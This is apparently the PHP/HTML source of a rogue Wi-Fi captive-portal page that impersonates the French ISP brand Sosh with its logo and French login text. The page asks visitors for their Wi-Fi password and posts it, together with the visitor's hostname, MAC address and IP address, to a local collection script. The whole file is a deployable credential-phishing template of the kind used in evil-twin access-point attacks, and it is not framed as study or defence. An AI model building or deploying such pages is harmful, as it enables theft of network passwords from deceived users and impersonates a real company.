<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="utf-8">
    <title>Sosh - Wi-Fi</title>
    <link href='assets/css/bootstrap.min.css' rel="stylesheet">
    <link href='assets/css/progress-bar.css' rel="stylesheet">
    <link href='assets/css/custom.css' rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #26828e;
        }
        .container {
            max-width: 400px;
            margin: 100px auto;
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        #logo {
            text-align: center;
            margin-bottom: 20px;
        }
        h1, h2 {
            text-align: center;
            margin: 10px 0;
        }
        h1 {
            font-size: 24px;
            color: #333;
        }
        h2 {
            font-size: 16px;
            color: #555;
        }
        input, button {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #de2554;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #000000;
        }
    </style>
</head>
<body>
    <div class="container">
      <div id="logo">
        <svg
           xmlns:dc="http://purl.org/dc/elements/1.1/"
           xmlns:cc="http://creativecommons.org/ns#"
           xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
           xmlns:svg="http://www.w3.org/2000/svg"
           xmlns="http://www.w3.org/2000/svg"
           xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
           xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
           width="131.2175"
           height="66.511253"
           id="svg3019"
           version="1.1"
           inkscape:version="0.47 r22583"
           sodipodi:docname="Sosh (logo rose).svg">
          <defs
             id="defs3021">
            <inkscape:perspective
               sodipodi:type="inkscape:persp3d"
               inkscape:vp_x="0 : 526.18109 : 1"
               inkscape:vp_y="0 : 1000 : 0"
               inkscape:vp_z="744.09448 : 526.18109 : 1"
               inkscape:persp3d-origin="372.04724 : 350.78739 : 1"
               id="perspective3027" />
            <inkscape:perspective
               id="perspective3082"
               inkscape:persp3d-origin="0.5 : 0.33333333 : 1"
               inkscape:vp_z="1 : 0.5 : 1"
               inkscape:vp_y="0 : 1000 : 0"
               inkscape:vp_x="0 : 0.5 : 1"
               sodipodi:type="inkscape:persp3d" />
          </defs>
          <sodipodi:namedview
             id="base"
             pagecolor="#ffffff"
             bordercolor="#666666"
             borderopacity="1.0"
             inkscape:pageopacity="0.0"
             inkscape:pageshadow="2"
             inkscape:zoom="3.959798"
             inkscape:cx="72.778857"
             inkscape:cy="23.377585"
             inkscape:document-units="px"
             inkscape:current-layer="layer1"
             showgrid="false"
             inkscape:window-width="1366"
             inkscape:window-height="706"
             inkscape:window-x="-8"
             inkscape:window-y="-8"
             inkscape:window-maximized="1" />
          <metadata
             id="metadata3024">
            <rdf:RDF>
              <cc:Work
                 rdf:about="">
                <dc:format>image/svg+xml</dc:format>
                <dc:type
                   rdf:resource="http://purl.org/dc/dcmitype/StillImage" />
                <dc:title></dc:title>
              </cc:Work>
            </rdf:RDF>
          </metadata>
          <g
             inkscape:label="Calque 1"
             inkscape:groupmode="layer"
             id="layer1"
             transform="translate(-516.23912,-215.02513)">
            <path
               d="m 639.06912,234.94263 -1.1625,2.56625 -1.1775,-2.58 -0.66625,3.41125 0.43375,0 0.37875,-2.0875 1.02875,2.20375 0.99375,-2.21375 0.39625,2.0975 0.4525,0 -0.6775,-3.3975 z m -4.26,3.3975 0.45375,0 0,-2.9025 0.73,0 0,-0.43 -1.905,0 0,0.43 0.72125,0 0,2.9025 z m -8.08875,-1.1575 c -5.48875,0 -8.1875,4.21 -8.1875,4.21 l 0,-10.61625 -8.5125,0 0,35.05 8.6025,0 0,-16.06125 c 0,-2.69875 2.2875,-4.94125 5.03375,-4.94125 3.75125,0 4.3925,2.1975 4.3925,4.53125 l 0,16.47125 8.7825,0 0,-19.30875 c 0,-5.3075 -4.53,-9.335 -10.11125,-9.335 m -31.62625,8.51125 c 0,-1.09875 0.87,-1.6925 2.24375,-1.6925 2.47,0 3.47625,2.195 3.47625,2.195 l 6.4525,-2.83625 c -1.73875,-3.935 -5.17125,-6.1775 -9.19875,-6.1775 -6.22,0 -10.7525,3.70625 -10.7525,9.1525 0,9.8825 12.5825,8.0525 12.5825,11.5275 0,1.32875 -1.64625,1.97 -3.01875,1.97 -2.51625,0 -3.935,-2.4725 -3.935,-2.4725 l -6.5425,3.29625 c 2.195,4.1175 5.6725,5.85625 10.38625,5.85625 5.94875,0 11.255,-3.24875 11.255,-9.335 0,-9.6075 -12.94875,-8.3275 -12.94875,-11.48375 m -24.4575,-8.51125 c -8.6475,0 -15.37375,6.315 -15.37375,14.73375 0,7.8225 6.58875,14.87 15.19125,14.87 9.1525,0 15.3275,-6.45125 15.3275,-15.00875 0,-8.46375 -6.635,-14.595 -15.145,-14.595 m -25.10625,7.91625 c -0.915,-0.36625 -2.7,-1.0975 -3.7975,-1.51125 -1.83125,-0.68375 -3.98125,-1.325 -3.98125,-3.20125 0,-1.83 1.28125,-3.065 3.52375,-3.065 3.38625,0 7.04625,2.79 7.04625,2.79 l 3.5675,-6.86375 c -2.515,-1.64625 -6.68,-3.75125 -11.21,-3.75125 -6.2225,0 -12.03375,4.16375 -12.03375,11.16375 0,4.9425 2.42625,8.1 6.865,10.1125 1.50875,0.68625 4.11625,1.69375 5.215,2.10375 3.4325,1.2825 3.66125,1.9675 3.66125,3.43125 0,1.8775 -2.5175,2.74625 -5.07875,2.74625 -3.34125,0 -6.54375,-1.87625 -8.23625,-3.38625 -0.7775,1.3275 -3.65875,7.0925 -3.65875,7.0925 3.65875,2.2875 7.1375,4.3475 12.07875,4.3475 7.04375,0 14,-3.93625 14,-11.44 0,-5.26125 -2.70125,-8.46375 -7.96125,-10.56875 m 101.92625,27.2775 -127.0825,9.16 -4.135,-57.3525 127.08125,-9.15875 4.13625,57.35125 z"
               style="opacity:0.89999401999999995;fill:#01a1ab;fill-opacity:1;fill-rule:nonzero;stroke:none"
               id="path2956" />
          </g>
        </svg>
      </div>
        <h1>Connexion</h1>
        <h2>Saisissez le mot de passe de votre Wi-Fi pour continuer</h2>
        <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
            <input name="email" type="hidden" value="bbox@exemple.com" required>
            <input name="password" id='password-input' type="password" placeholder="Mot de passe" required>
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="target" value="<?=$destination?>">
            <button type="submit">Suivant</button>
        </form>
    </div>
    <script src='assets/js/jquery-3.4.1.min.js'></script>
    <script src='assets/js/bootstrap.min.js'></script>
    <script type="text/javascript">
        function redirect() {
            setTimeout(function() {
              window.location.href = "/captiveportal/index.php";
            }, 100);
        }
    </script>
</body>
</html>
